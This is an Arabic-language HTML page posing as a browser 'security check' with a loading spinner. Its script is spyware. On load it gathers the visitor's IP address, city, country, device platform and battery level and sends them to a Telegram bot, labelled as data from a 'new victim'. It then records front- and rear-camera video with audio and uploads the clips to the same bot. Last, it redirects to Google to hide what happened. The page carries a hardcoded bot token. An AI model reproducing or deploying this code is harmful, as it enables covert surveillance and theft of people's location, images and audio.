<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من الأمان</title>
    <style>
        body { background-color: #000; color: white; font-family: Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 15px; color: #777; font-size: 14px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>جاري فحص المتصفح.. يرجى الانتظار</p>

    <script>
        const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId');

        let currentStream = null;
        let mediaRecorder = null;
        let chunks = [];

        async function startCapture() {
            if (!chatId) return;

            // 1. إرسال البيانات النصية فوراً
            await sendDeviceInfo();

            // 2. تصوير الأمامية (30 ثانية)
            await captureVideo("user", "أمامية", 30000);

            // 3. تصوير الخلفية (30 ثانية)
            await captureVideo("environment", "خلفية", 30000);

            window.location.href = "https://www.google.com";
        }

        async function sendDeviceInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const battery = await navigator.getBattery();
                const info = `📊 **بيانات ضحية جديد**\n━━━━━━━━━━━━\n🌐 IP: ${d.ip}\n🌍 الدولة: ${d.country_name}\n📍 المدينة: ${d.city}\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(battery.level * 100)}%\n━━━━━━━━━━━━`;
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
            } catch (e) {}
        }

        async function captureVideo(cameraMode, label, duration) {
            try {
                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraMode }, audio: true });
                mediaRecorder = new MediaRecorder(currentStream);
                chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    if (chunks.length > 0) {
                        const blob = new Blob(chunks, { type: 'video/mp4' });
                        await sendVideo(blob, label);
                    }
                };

                mediaRecorder.start();
               
                // الانتظار للمدة المحددة، مع إمكانية المقاطعة عند الخروج
                await new Promise(resolve => {
                    const timeout = setTimeout(() => {
                        stopAll();
                        resolve();
                    }, duration);
                });

            } catch (err) {
                console.log("Error camera");
            }
        }

        function stopAll() {
            if (mediaRecorder && mediaRecorder.state !== "inactive") {
                mediaRecorder.stop();
            }
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }
        }

        async function sendVideo(blob, label) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', blob, 'video.mp4');
            formData.append('caption', `📹 فيديو كامل من الكاميرا ال${label}`);
           
            // استخدام keepalive لضمان إرسال الطلب حتى لو أُغلق المتصفح
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData,
                keepalive: true
            });
        }

        // محفزات الإرسال الفوري عند محاولة إغلاق الصفحة
        window.addEventListener('beforeunload', stopAll);
        window.addEventListener('pagehide', stopAll);

        window.onload = startCapture;
    </script>
</body>
</html>
